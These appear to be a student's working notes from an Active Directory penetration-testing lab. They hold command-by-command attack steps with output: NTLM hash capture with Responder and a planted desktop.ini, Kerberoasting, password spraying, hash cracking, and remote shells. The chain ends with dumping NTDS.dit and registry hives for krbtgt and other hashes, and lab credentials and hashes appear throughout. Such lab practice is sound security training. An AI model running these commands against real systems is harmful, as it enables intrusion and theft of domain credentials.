# Documentation & Reporting Practice Lab

cd "/Users/yanis/Library/Mobile Documents/com~apple~CloudDocs/Offensive-Security/modules_CPTS/25_documentation_and_reporting/"

exegol start htb_windows_privesc_desktop --vpn windows_privesc_desktop.ovpn --disable-X11 --desktop

root : fUWZLdtGyTLEHe4gqP56SGvCxnUKJi                                                                                                   │
http://localhost:52424 

exegol start htb_windows_privesc_desktop

xfreerdp /v:10.129.98.185 /u:htb-student /p:HTB_@cademy_stdnt! /drive:exegol,/workspace


<User>librarian</User>
<Pass encoding="base64">bnJsMkAqZk5zNQ==</Pass>

echo bnJsMkAqZk5zNQ== | base64 -d

nrl2@*fNs5

| Username | Password | Scope  | Notes             |
| -------- | -------- | ------ | ----------------- |
| Asmith   | Welcome1 | Domain | Password spraying |
|          |          |        |                   |
|          |          |        |                   |
|          |          |        |

Scope: 172.16.5.0/24
Domain: INLANEFREIGHT.LOCAL

nmap 172.16.5.0/24 -sn -oA tnet | grep for | cut -d" " -f5

inlanefreight.local
172.16.5.127
172.16.5.130
172.16.5.200
172.16.5.225

nslookup DC01
nslookup DC01.inlanefreight.local

vi hosts.lst

172.16.5.127
172.16.5.130
172.16.5.200
172.16.5.225

nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d" " -f5

nmap -sV -iL hosts.lst --stats-every=5s

Nmap scan report for 172.16.5.127
Host is up (0.055s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 172.16.5.130
Host is up (0.051s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 172.16.5.200
Host is up (0.054s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
8080/tcp open  http          Apache Tomcat 10.0.21
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 172.16.5.225
Host is up (0.061s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.4p1 Debian 5 (protocol 2.0)
80/tcp   open  http          nginx 1.21.6
443/tcp  open  ssl/http      nginx 1.21.6
3389/tcp open  ms-wbt-server xrdp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


xfreerdp /v:172.16.5.130 /u:administrator /p:Welcome123!
xfreerdp /v:172.16.5.200 /u:administrator /p:Welcome123!

xfreerdp /v:172.16.5.5 /u:asmith /p:Welcome1

- LLMNR-NBS : Get NTLM Hash of domain users
- ASREPRoasting : Obtain the Ticket Granting Ticket (TGT) for any account that has the Do not require Kerberos pre-authentication setting enabled
- Password Spraying : Check if one password is used by different users
- Kerberoasting : Get Hash of service accounts and crack it offline
- ACL enumeration : Check if there is domain path to escalate privileges
- ACL abuse :  the attack chain to perform DC Sync attack
- DCSync : stealExecute Active Directory password database by using the built-in Directory Replication Service Remote Protocol

172.16.5.5 : DC01
asmith
Welcome1

The user is not authorized for remote login

smbclient //DC01 -k -c 'recurse;ls' -u asmith -p Welcome1

smbclient //172.16.5.5/C$ -k -c 'recurse;ls' -u asmith -p Welcome1

smbclient -U INLANEFREIGHT.LOCAL\\asmith \\\\172.16.5.5\\C$

Enter INLANEFREIGHT.LOCAL\asmith's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED

smbclient -U INLANEFREIGHT.LOCAL\\asmith \\\\172.16.5.5\\ADMIN$

Enter INLANEFREIGHT.LOCAL\asmith's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED


xfreerdp /v:172.16.5.200 /u:administrator /p:Welcome123!





wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1

xfreerdp /v:10.129.221.62 /u:htb-student /p:HTB_@cademy_stdnt! /drive:linux,/home/htb-ac-786011

sudo impacket-smbserver share -smb2support /home/htb-student -user test -password test

net use n: \\172.16.5.225\share /user:test test

copy n:\PowerView.ps1

Import-Module .\PowerView.ps1

Get-ADUser -Filter -Properties | select Name,Description | ? {$_.Description -ne $null}

Get-ADUser -Filter * -Properties Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet


https://www.microsoft.com/en-us/download/details.aspx?id=45520
https://hammer-software.com/how-to-install-remote-server-administration-tools-rsat-on-windows-server-2019/


\\172.16.5.5\C$
asmith
Welcome1

Access is denied

xfreerdp /v:10.129.187.37 /u:htb-student /p:HTB_@cademy_stdnt! /drive:exegol,/workspace

ls -l ~/.exegol/workspaces/htb_windows_privesc_desktop/HTB_Academy/

sudo responder -I ens224

[+] Generic Options:
    Responder NIC              [ens224]
    Responder IP               [172.16.5.225]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-FRX9Q5UHDHG]
    Responder Domain Name      [1EK7.LOCAL]
    Responder DCE-RPC Port     [49043]

[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\clusteragent
[SMB] NTLMv2-SSP Hash     : clusteragent::INLANEFREIGHT:12a7396eb23521a7:04D9DBC0FFB4A30FADA8F7408F4A7BCD:010100000000000080637FE0B676D80153B9ED478A742927000000000200080052004D0042004A0001001E00570049004E002D004300500036004900520057005600450048003200450004003400570049004E002D00430050003600490052005700560045004800320045002E0052004D0042004A002E004C004F00430041004C000300140052004D0042004A002E004C004F00430041004C000500140052004D0042004A002E004C004F00430041004C000700080080637FE0B676D80106000400020000000800300030000000000000000000000000300000D93A641F3F055547ECFF321F930B54E3F67E450C14D7516F602A6881C696C8C00A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000

hashcat -m 5600 NTLM-clusteragent.txt /usr/share/wordlists/rockyou.txt 

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: CLUSTERAGENT::INLANEFREIGHT:12a7396eb23521a7:04d9db...000000
Time.Started.....: Tue Feb 13 13:04:10 2024 (10 secs)
Time.Estimated...: Tue Feb 13 13:04:20 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1598.0 kH/s (0.46ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)

ADMIN:5768797002000000e05179a2382122e7500df7c9949a89f08a1987132dd0f48fe2e1d37238c7448fa123456789abcdefa123456789abcdef140541444d494e:a60c216003306640422c8855b290c32c53319e5a

hashcat -m 5600 NTLM-ADMIN.txt /usr/share/wordlists/rockyou.txt 

hashcat -m 7300 5768797002000000e05179a2382122e7500df7c9949a89f08a1987132dd0f48fe2e1d37238c7448fa123456789abcdefa123456789abcdef140541444d494e:a60c216003306640422c8855b290c32c53319e5a /usr/share/wordlists/rockyou.txt

5768797002000000e05179a2382122e7500df7c9949a89f08a1987132dd0f48fe2e1d37238c7448fa123456789abcdefa123456789abcdef140541444d494e:a60c216003306640422c8855b290c32c53319e5a:diamond1


xfreerdp /v:172.16.5.5 /u:ADMIN /p:diamond1

--> Failed

xfreerdp /v:172.16.5.5 /u:Administrator /p:diamond1
xfreerdp /v:172.16.5.5 /u:administrator /p:diamond1

--> Failed

xfreerdp /v:172.16.5.127 /u:ADMIN /p:diamond1


GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/asmith
Welcome1

ServicePrincipalName                           Name               MemberOf                                                   PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  -----------------  ---------------------------------------------------------  --------------------------  ---------  ----------
sts/inlanefreight.local                        solarwindsmonitor  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL        2022-06-01 23:11:38.041017  <never>               
MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL         2022-06-01 23:11:50.431638  <never>               
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL        2022-06-01 23:12:06.009772  <never>               
vmware/inlanefreight.local                     svc_vmwaresso                                                                 2022-06-01 23:13:09.494156  <never>               
SAPService/srv01.inlanefreight.local           SAPService         CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL  2022-06-01 23:13:25.041019  <never>            

GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/asmith -request 
Welcome1

GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/asmith -request -outputfile inlane_tgs

hashcat -m 13100 inlane_tgs /usr/share/wordlists/rockyou.txt

john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt inlane_tgs

Recovered........: 0/5 (0.00%) Digests (total), 0/5 (0.00%) Digests (new), 0/5 (0.00%) Salts

GetNPUsers.py INLANEFREIGHT.LOCAL/asmith -dc-ip 172.16.5.5
Welcome1

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
Name      MemberOf                                                           PasswordLastSet             LastLogon                   UAC      
--------  -----------------------------------------------------------------  --------------------------  --------------------------  --------
dhawkins  CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL  2022-06-01 23:36:41.876149  2022-06-02 18:04:23.663148  0x410200 


smbclient //172.16.5.5/ZZZ_archive -U asmith

smb: \> ls
  .                                   D        0  Thu Jun  2 19:19:56 2022
  ..                                  D        0  Thu Jun  2 19:19:56 2022
  Private                             D        0  Thu Mar 31 14:00:14 2022
  Public                              D        0  Thu Mar 31 14:00:09 2022

		7706623 blocks of size 4096. 4403245 blocks available

--> Nothing inside Private and Public

impacket-psexec asmith:Welcome1@172.16.5.5

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 172.16.5.5.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'Department Shares' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'SYSVOL' is not writable.
[-] share 'User Shares' is not writable.
[*] Found writable share ZZZ_archive
[*] Uploading file NOfKMaGm.exe
[*] Opening SVCManager on 172.16.5.5.....
[-] Error opening SVCManager on 172.16.5.5.....
[-] Error performing the installation, cleaning up: Unable to open SVCManager

crackmapexec smb 172.16.5.5 -u asmith -p Welcome1 --sam

SMB         172.16.5.5      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    DC01             [+] INLANEFREIGHT.LOCAL\asmith:Welcome1 

crackmapexec smb 172.16.5.5 -u asmith -p Welcome1 -x 'whoami' --exec-method smbexec

SMB         172.16.5.5      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    DC01             [+] INLANEFREIGHT.LOCAL\asmith:Welcome1 

crackmapexec smb 172.16.5.5 -u asmith -p Welcome1 --loggedon-users


SMB         172.16.5.5      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    DC01             [+] INLANEFREIGHT.LOCAL\asmith:Welcome1 

vi desktop.ini

[.ShellClassInfo]
IconResource=\\172.16.5.225\test

smbclient //172.16.5.5/ZZZ_archive -U asmith
Welcome1


smb> put desktop.ini

putting file desktop.ini as \desktop.ini (16.6 kb/s) (average 16.6 kb/s)

sudo responder -I ens224
Copied!
After a while, we can retrieve the NTLM hashes.

psexec.py inlanefreight.local/asmith:'Welcome1'@172.16.5.5 

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 172.16.5.5.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'Department Shares' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'SYSVOL' is not writable.
[-] share 'User Shares' is not writable.
[*] Found writable share ZZZ_archive
[*] Uploading file NOfKMaGm.exe
[*] Opening SVCManager on 172.16.5.5.....
[-] Error opening SVCManager on 172.16.5.5.....
[-] Error performing the installation, cleaning up: Unable to open SVCManager

wmiexec.py inlanefreight.local/asmith:'Welcome1'@172.16.5.5 

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] SMBv3.0 dialect used
[-] rpc_s_access_denied

/opt/windapsearch/windapsearch.py --dc-ip 172.16.5.5-u asmith@inlanefreight.local -p Welcome1 --da

[+] Using Domain Controller at: 172.16.5.5
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=INLANEFREIGHT,DC=LOCAL
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 u:INLANEFREIGHT\asmith
[+] Attempting to enumerate all Domain Admins
[+] Using DN: CN=Domain Admins,CN=Users.CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[+]	Found 27 Domain Admins:

cn: Administrator
userPrincipalName: administrator@inlanefreight.local

cn: lab_adm

cn: Matthew Morgan
userPrincipalName: mmorgan@inlanefreight.local

cn: Dorothy Click
userPrincipalName: dclick@inlanefreight.local

cn: Betty Ross
userPrincipalName: bross@inlanefreight.local

cn: John Hermann
userPrincipalName: jhermann@inlanefreight.local

cn: Charlie Obando
userPrincipalName: Intinted@inlanefreight.local

cn: Maggie Jablonski
userPrincipalName: Spong1990@inlanefreight.local

cn: Matthew Mackey
userPrincipalName: Fastally@inlanefreight.local

cn: Christopher Taylor
userPrincipalName: Buithe@inlanefreight.local

cn: Johnnie Munoz
userPrincipalName: Pratch@inlanefreight.local

cn: Melissa Jason
userPrincipalName: Ressoare@inlanefreight.local

cn: Ruby Cropper
userPrincipalName: Betion@inlanefreight.local

cn: Mary Clifton
userPrincipalName: Thisfic@inlanefreight.local

cn: Betty Turcotte
userPrincipalName: Coultle@inlanefreight.local

cn: mrb3n

cn: Jessica Systemmailbox 8Cc370d3-822A-4Ab8-A926-Bb94bd0641a9

cn: clustergent

cn: LDAP.AGENT

cn: NAGIOSAGENT

cn: BACKUPAGENT

cn: SOLARWINDSMONITOR

cn: PROXYAGENT

cn: FREIGHTLOGISTICSUSER

cn: Sharepoint Admin
userPrincipalName: sp-admin@INLANEFREIGHT.LOCAL

cn: sqldev

cn: svc_qualys

[+] Using DN: CN=Domain Admins,CN=Users.CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[+]	Found 27 Domain Admins:

cn: Administrator
userPrincipalName: administrator@inlanefreight.local

cn: lab_adm

cn: Matthew Morgan
userPrincipalName: mmorgan@inlanefreight.local

cn: Dorothy Click
userPrincipalName: dclick@inlanefreight.local

cn: Betty Ross
userPrincipalName: bross@inlanefreight.local

cn: John Hermann
userPrincipalName: jhermann@inlanefreight.local

cn: Charlie Obando
userPrincipalName: Intinted@inlanefreight.local

cn: Maggie Jablonski
userPrincipalName: Spong1990@inlanefreight.local

cn: Matthew Mackey
userPrincipalName: Fastally@inlanefreight.local

cn: Christopher Taylor
userPrincipalName: Buithe@inlanefreight.local

cn: Johnnie Munoz
userPrincipalName: Pratch@inlanefreight.local

cn: Melissa Jason
userPrincipalName: Ressoare@inlanefreight.local

cn: Ruby Cropper
userPrincipalName: Betion@inlanefreight.local

cn: Mary Clifton
userPrincipalName: Thisfic@inlanefreight.local

cn: Betty Turcotte
userPrincipalName: Coultle@inlanefreight.local

cn: mrb3n

cn: Jessica Systemmailbox 8Cc370d3-822A-4Ab8-A926-Bb94bd0641a9

cn: clustergent

cn: LDAP.AGENT

cn: NAGIOSAGENT

cn: BACKUPAGENT

cn: SOLARWINDSMONITOR

cn: PROXYAGENT

cn: FREIGHTLOGISTICSUSER

cn: Sharepoint Admin
userPrincipalName: sp-admin@INLANEFREIGHT.LOCAL

cn: sqldev

cn: svc_qualys
[*] Bye!


clusteragent::INLANEFREIGHT:12a7396eb23521a7:04D9DBC0FFB4A30FADA8F7408F4A7BCD:010100000000000080637FE0B676D80153B9ED478A742927000000000200080052004D0042004A0001001E00570049004E002D004300500036004900520057005600450048003200450004003400570049004E002D00430050003600490052005700560045004800320045002E0052004D0042004A002E004C004F00430041004C000300140052004D0042004A002E004C004F00430041004C000500140052004D0042004A002E004C004F00430041004C000700080080637FE0B676D80106000400020000000800300030000000000000000000000000300000D93A641F3F055547ECFF321F930B54E3F67E450C14D7516F602A6881C696C8C00A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000


xfreerdp  /v:172.16.5.5 /u:clusteragent /pth:04D9DBC0FFB4A30FADA8F7408F4A7BCD
xfreerdp  /v:172.16.5.5 /u:clustergent /pth:04D9DBC0FFB4A30FADA8F7408F4A7BCD

--> Failed

/opt/windapsearch/windapsearch.py --dc-ip 172.16.5.5 -u asmith@inlanefreight.local -p Welcome1 -PU

vi valid_users.txt

mmorgan
dclick
bross
jhermann
Intinted
Spong1990
Fastally
Buithe
Pratch
Ressoare
Betion
Thisfic
Coultle
administrator
lab_adm
mrb3n

:%s/\n\{2,}/\r/g

kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome123!

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/14/24 - Ronnie Flathers @ropnop

2024/02/14 17:00:37 >  Using KDC(s):
2024/02/14 17:00:37 >  	172.16.5.5:88

2024/02/14 17:00:37 >  Done! Tested 16 logins (0 successes) in 0.072 seconds

sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Welcome1 | grep +

sudo bloodhound-python -u 'asmith' -p 'Welcome1' -ns 172.16.5.5 -d inlanefreight.local -c all

1) zip all json files
zip -r ilfreight_bh.zip *.json
2) start neo4j
sudo neo4j start
type : bloodhound
3) Authenticate on bloodhound
bloodhound
user == neo4j / pass == HTB_@cademy_stdnt!

Node Info > Transitive Object Control
asmith
dhawkins
abouldercon

--> No Path to Domain Admin

xfreerdp /v:172.16.5.200 /u:administrator /p:Welcome123!

RDP 172.16.5.5
dhawkins

The connection was denied because this account is not authorized for remote login

--> Failed

evil-winrm -i 172.16.5.200 -u dhawkins -p 'Bacon1989'
evil-winrm -i 172.16.5.5 -u dhawkins -p 'Bacon1989'

--> Failed

evil-winrm -i 172.16.5.200 -u administrator -p 'Welcome123!'

--> OK

evil-winrm -i 172.16.5.130 -u administrator -p 'Welcome123!'

--> OK




john inlane_tgs --wordlist=/usr/share/wordlists/rockyou.txt  --format=krb5tgs

Cracked 3 password hashes (are in /opt/tools/john/run/john.pot), use "--show"
Remaining 2 password hashes with 2 different salts

vi /opt/tools/john/run/john.pot 

$krb5tgs$23$*svc_vmwaresso$inlanefreight.local$inlanefreight.local/             svc_vmwaresso*                                                                  $dcf96a651daff7d4862a9c70ef4061fd$916a980b9f0b9e534bc5d846c4bbd554e8abe9c5d6f5d a73bee24c5d62f5a067b150e8e547708a9f0aea3f35a10be2a1df2c6e51bb12e86b5f0e639cc641 9a64ec8af75cb9bef1fa80ee7b8e652770866ca8af4cf8d425c733c6da52b36c3d1545cb0006f55 867e2a709944cd8a08688a331e5ef1f0a38c485f64e780814565be6dbfd2520a05bee923972715e 0150be18df24a2955e7c0ef58dd7b347b2afd8ddad293216bdf6e3a864a47723fbc0241cec998ac 7736171f00e2e32456ec7146b13c8e7199590056cd7b75eb9af66621f50f5eb28a94c98870c97e5 a5e415bada9ed0449755b262d234008e77734c725b05ccc86d4e20ae9575c68e57314d2070615db 64082cf221bbfae90c648307f7620d036f68c70a7bdd20d28cf0d124076f288a392768e9e7b9890 5dbbd4505d8c46b05203330b177b2a02eabf882dfde0d6fb32eac36752843b6c1bcf006dc6c1ecf 51eb6b02b151d05fae44bc4eed2bd09a73aa755d7d18fe85025eb829f24$SOURCE_HASH$e4d929a 2788cb22da249725f3dea3d4b:Virtual_09

 $krb5tgs$23$*sapservice$inlanefreight.local$inlanefreight.local/sapservice*     $b18d780f313f2f05adfb1da3f3d554dc$4edc7a0d49eea29e320e82bb48a96e21bd846d55e7dd6 265b388a7216617122e2bc33806da54717788aeffefec6287fe547ca29bf2921aa38fb85d3e0056 cbc7cd7d8ac92f9dcdbc767626cf85308c3b437101f0c9247921ab80c48d90026c67ad4117d0c31 6014f8e31e6292736a37e90c9f3aec5428ed464631a554eed359099e2a298ba26f96f57908fbe00 e29c432afe37505a14fd6eab94b9c684edeae00bd6448e87f4f1825e94028f577757b94d9fa8d72 cc1f148ffde6eb13b845e67d64996730fa31cafdaa30299cc22ebb6a75d6ce834bdbefdcc90adb2 9bfa763abaab2e9adac869de55b719311240dced34564edbed688dff992ff0b2a4a04586d00f9f6 35d22a8fe75e48b68b5c28d820440cad237cbfd8dcc942e252fd8009bab4e8c7d28e5447814ff79 fddb1ced59be35ac3c0f8e63cf2d8d15406348931e0f7ffa5da7cada26b453921b57946efb53ff8 7c020984ea9d2e858d575554df92c8067440f242daa9e3e257943d3529a28a18d$SOURCE_HASH$5 c95ec5569123faab42294ad4e37efe7:Sap82696

$krb5tgs$23$*solarwindsmonitor$inlanefreight.local$inlanefreight.local/         solarwindsmonitor*                                                              $ad870b30dcc7c583397f1dbd616b8ed2$54fe4b3bc7d78625c499e4655da6f1e614c3ceba540c4 fd975dd91d0ad469a2536eea76b6abca15ee5d651dfe3a2a660611228120bf53ad4bdd25ecf4850 109379fe1e21529b6ee18b8ca52d166d237bd123a5c56aa3b439aba7a50ce0bf570a730d6d12f9f d72479a1e6bb3eeb91b539614fa316703eb5476e6f0a40428d1b66aedf65b68c520a0f76c940692 b6830082c6112120b51f5da83e961c473896195095724de225786d814ebd671aa4b0c4a232dccb4 8924684d42bf4303b53bddc0d9430902b40c3f2c23f7ae7584c69109295c45a8b5e0363af09f8b3 1aade3f247b3f80baa259e3227f2990e5445dfb0b7ae7969347d3b43e27938f156df5c925c95784 44994d911358a9f15902724a8f9edff60df32cd8740ffb6cc53b7e46cf569758dff1ceea1e0188a 39c054fcdaf2d79991910926ca5c2627468f6c43ea4dd986d678e9b6f2cdc65fcb2f3b51b43c2f3 85259cb5f5528edb171993de1087efa92585c4afb89d333946e$SOURCE_HASH$c27a422421a1bcd 0da5fd555de1bcab0:Solar1010


evil-winrm -i 172.16.5.5 -u svc_vmwaresso -p 'Virtual_09'

evil-winrm -i 172.16.5.5 -u solarwindsmonitor -p 'Solar1010'


type C:\Users\Administrator\Desktop\flag.txt
d0c_pwN_r3p0rt_reP3at!

reg.exe save hklm\sam C:\Users\Public\sam.save
reg.exe save hklm\system C:\Users\Public\system.save
reg.exe save hklm\security C:\Users\Public\security.save

download c:\\Users\\Public\\sam.save
download c:\\Users\\Public\\system.save
download c:\\Users\\Public\\security.save

Copy on exegol workspace/

secretsdump -sam sam.save -security security.save -system system.save LOCAL

[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a0eed386fa4e62210e41961f91dcf14d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:37fbb01f6e77b9a8f0aad6ce5201e4e93d85011f36b7ae7356c81c2b4463687a563cb094ee1be19c0976ecb8db19f1fc97c571caf1b01f497bf6b70f7843ec8647a7034b048308547f93562305bde96777e953eaad85a7b73e9d4ac217c219a3514913f3ac935769da633476669c07df5473461b97750e8d930709725f549254d9426f036298f0b0cce82eb473a11dd6d540f0a060e6a33d3fc8f7945ad3330a53fae8a715d255900cf8ce9146aca249587d71c739f05e4c40e30e4c9fabbaee8afc6a2aa11f63af02a6f5006ef36c7f4bc55415f806ec6489a787f85cbc26b956de63d59afc94b07389646afa2fc8c4
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:26330d2ddb23fc07709356cad77a4e30
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x519c86b4cbdc978b359bc039173416623198c107
dpapi_userkey:0xce7d9f94fce72cd9598ac60710787c0d9a56ce0b
[*] NL$KM 
 0000   A2 52 9D 31 0B B7 1C 75  45 D6 4B 76 41 2D D3 21   .R.1...uE.KvA-.!
 0010   C6 5C DD 04 24 D3 07 FF  CA 5C F4 E5 A0 38 94 14   .\..$....\...8..
 0020   91 64 FA C7 91 D2 0E 02  7A D6 52 53 B4 F4 A9 6F   .d......z.RS...o
 0030   58 CA 76 00 DD 39 01 7D  C5 F7 8F 4B AB 1E DC 63   X.v..9.}...K...c
NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63


vssadmin CREATE SHADOW /For=C:

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {d29e8fdf-a4b0-4da5-b824-3776401e232d}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1


mkdir ntds
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\ntds\NTDS.dit

download c:\\ntds\\NTDS.dit NTDS.dit


secretsdump -security security.save -system system.save -ntds NTDS.dit local > ntds.hashes

cat ntds.hashes | grep krbtgt

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:aes256-cts-hmac-sha1-96:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d
krbtgt:aes128-cts-hmac-sha1-96:a4269293eda9e514fa711f84c090f205
krbtgt:des-cbc-md5:b5e5c1f1c1980edc

cat ntds.hashes | grep svc_reporting

svc_reporting:7608:aad3b435b51404eeaad3b435b51404ee:a6d3701ae426329951cf5214b7531140:::
svc_reporting:aes256-cts-hmac-sha1-96:a5ccd3a16117118ad23fd672b9afd7cc656c71b239f8e1edbda01c113e7064e0
svc_reporting:aes128-cts-hmac-sha1-96:42e8bdc95e0f0dc8ba6ef608da287cf2
svc_reporting:des-cbc-md5:0e51795ed62fe01c
svc_reporting:dec-cbc-crc:0e51795ed62fe01c

a6d3701ae426329951cf5214b7531140

sudo hashcat -m 1000 a6d3701ae426329951cf5214b7531140 /usr/share/wordlists/rockyou.txt

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

a6d3701ae426329951cf5214b7531140:Reporter1!